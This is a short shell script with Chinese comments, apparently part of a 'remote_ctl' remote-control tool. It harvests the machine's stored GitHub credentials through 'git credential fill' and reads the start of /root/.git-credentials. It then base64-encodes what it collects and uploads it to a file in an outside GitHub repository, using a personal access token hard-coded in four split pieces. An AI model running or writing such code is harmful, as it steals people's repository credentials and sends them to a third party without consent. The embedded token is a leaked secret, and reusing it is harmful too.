# 验证remote_ctl实际用的get_tok路径(git credential fill)读回的token,并检查out.txt写入
A='github_pat_11BQPEBSA0iH'
B='riCXm9QGCt_74skvWNFHKum'
C='HCtG6L026yU4FNjISYSZVmI'
D='jR9F9Ojw3QEXVSIPygfznQqG'
TOK="${A}${B}${C}${D}"
API="https://api.github.com/repos/Thousands91/-1/contents/remote"
# get_tok真实路径(给10秒超时防卡死)
FILL=$(printf 'protocol=https\nhost=github.com\n\n' | timeout 10 git credential fill 2>/dev/null | sed -n 's/^password=//p' | head -1)
FPRE="${FILL:0:12} LEN=${#FILL}"
# 凭据文件原文前40字符(看格式对不对)
HEAD40=$(head -c 40 /root/.git-credentials 2>/dev/null)
# 用fill读到的token测out.txt PUT(这就是remote_ctl写out.txt的真实路径)
CODE=$(timeout 15 curl -s -o /dev/null -w '%{http_code}' --max-time 13 -X PUT -H "Authorization: token $FILL" "$API/_filltest.txt" -d '{"message":"ft","content":"dGVzdA==","branch":"main"}' 2>/dev/null)
NOW=$(date '+%m-%d %H:%M:%S')
R="time=$NOW | gitfill读=$FPRE | cred前40=$HEAD40 | fill_PUT=$CODE"
BB=$(echo -n "$R" | base64 -w0)
# 用自带token回传结果(fill若不可用,保证结果能写回)
SHA=$(timeout 15 curl -s -H "Authorization: token $TOK" "$API/fillcheck.txt" 2>/dev/null | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
if [ -n "$SHA" ]; then P="{\"message\":\"fillcheck\",\"content\":\"$BB\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else P="{\"message\":\"fillcheck\",\"content\":\"$BB\",\"branch\":\"main\"}"; fi
curl -s --max-time 20 -X PUT -H "Authorization: token $TOK" "$API/fillcheck.txt" -d "$P" -o /dev/null -w "PUT:%{http_code}\n"
